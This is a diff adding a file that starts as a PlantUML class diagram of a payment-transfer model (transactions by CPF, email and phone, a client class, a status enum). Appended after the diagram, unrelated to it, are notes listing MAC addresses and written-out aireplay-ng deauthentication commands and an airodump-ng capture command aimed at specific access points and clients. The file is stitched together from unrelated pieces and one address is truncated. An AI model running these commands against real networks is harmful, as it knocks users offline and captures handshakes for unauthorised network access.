@@ -1,0 +1,55 @@
+@startuml
+
+enum TransactionStatus {
+  Sucess
+  Failed
+  Pending
+  Canceled
+}
+
+
+abstract class Transaction {
+ #Date DateTime;
+ #transferValue()
+ -validKey()
+ #Status : TransactionStatus 
+}
+
+class TransactionByCpf {
+
+} 
+
+class TransactionByEmail {
+}
+
+class TransactionByTelefone {
+}
+
+
+class Client {
+ - cpf string
+ - email string
+ - telefone string 
+}
+
+Transaction <|.. TransactionByCpf
+Transaction <|.. TransactionByEmail
+Transaction <|.. TransactionByTelefone
+
+TransactionStatus -- Transaction
+Client o- Transaction
+
+@enduml
+
+60:7E:CD:0D:C0:C0 # original
+0A:1D:24:8B:64:2C
+
+aireplay-ng -0 2 -a 3E:3A:BA:E0:40:30 -c 60:7E:CD:0D:C0:C0 wlp2s0mon
+aireplay-ng -0 2 -a 3C:F9:F0:AD:08:24 -c 50:92:B9:D9:63:22 wlp2s0mon
+aireplay-ng -0 2 -a 60:7E:CD:0D:C0:C0 -c 50:8B:B9:22:67:42 wlp2s0mon
+aireplay-ng -0 2 -a 3C:F9:F0:AD:08:24 wlp2s0mon
+aireplay-ng -0 2 -a 3E:3A:BA:E0:40:30 wlp2s0mon
+
+
+
+airodump-ng -c 4 --bssid 3C:F9:F0:AD:08:2 -w . wlp2s0mon
